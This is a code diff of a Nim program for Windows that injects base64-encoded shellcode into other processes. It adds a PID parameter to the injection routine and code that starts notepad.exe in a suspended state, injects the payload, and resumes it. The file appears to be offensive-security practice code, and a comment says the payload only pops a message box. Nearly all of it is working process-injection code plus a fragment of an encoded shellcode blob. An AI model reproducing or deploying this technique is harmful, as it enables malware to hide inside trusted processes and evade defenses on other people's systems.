@@ -1,4 +1,4 @@
-import winim/lean, base64, osproc, winim/inc/psapi, unicode, strutils
+import winim/lean, base64, osproc, winim/inc/psapi, unicode, strutils, strformat
 import winim/inc/tlhelp32
 import createSuspendedProcess
 
@@ -21,7 +21,7 @@ proc getExplorerPID(): DWORD =
   if Process32FirstW(hSnapshot, processEntry):
     # Print first process
     var procName = cast[WideCString](addr processEntry.szExeFile[0])
-  #  echo "Process: ", $procName
+  # echo "Process: ", $procName
     if ($procName).toLowerAscii() == "explorer.exe":
       result = processEntry.th32ProcessID
       found = true
@@ -29,7 +29,7 @@ proc getExplorerPID(): DWORD =
     # Iterate through remaining processes
     while Process32NextW(hSnapshot, processEntry):
       procName = cast[WideCString](addr processEntry.szExeFile[0])
-      echo "Process: ", $procName
+    # echo "Process: ", $procName
       if ($procName).toLowerAscii() == "explorer.exe":
         result = processEntry.th32ProcessID
         found = true
@@ -41,9 +41,10 @@ proc getExplorerPID(): DWORD =
   if not found:
     return 0
 
-proc injectShellcode(shellcode: openarray[byte]): void =
+proc injectShellcode(shellcode: openarray[byte], pid: DWORD = 0): void =
     echo ".oO finding PID Oo."
-    let targetPID = getExplorerPID()
+    let targetPID = if pid == 0: getExplorerPID() else: pid
+    
     if targetPID == 0:
         echo "Could not find explorer.exe process."
         return
@@ -159,6 +160,10 @@ ieJXV1dNMcBqDVlBUOL8ZsdEJFQBAUiNRCQYxgBoSInmVlBBUEFQQVBJ/8BBUEn/yE2JwUyJwUG6
 ecw/hv/VSDHSSP/Kiw5BugiHHWD/1bvwtaJWQbqmlb2d/9VIg8QoPAZ8CoD74HUFu0cTcm9qAFlB
 idr/1Q==
 """  
+var
+    processId: DWORD
+    procHandle: HANDLE
+    threadHandle: HANDLE
 
 let decodedData = decode(base64Str)
 echo "decoded:", decodedData
@@ -167,6 +172,28 @@ var buf: array[1642, byte] # is it 316
 copyMem(unsafeAddr(buf[0]), unsafeAddr(decodedData[0]), decodedData.len)
 
 # pop msgbox
-injectShellcode(buf)
-#executeShellcode(buf)
+let csp = createSuspendedProcess(
+        "notepad.exe",
+        addr processId,
+        addr procHandle,
+        addr threadHandle
+    )
+
+if csp:
+    echo fmt"""
+        Process Details:
+        ---------------
+        PID: {processId}
+        Process Handle: {procHandle}
+        Thread Handle: {threadHandle}
+        """
+    echo ".oO injecting thread into suspended process Oo."
+    injectShellcode(buf, processId)
+    echo ".oO Resuming process Oo."
+
+    discard resumeThread(threadHandle)
+# executeShellcode(buf)
+
+
+
 echo "Success!"
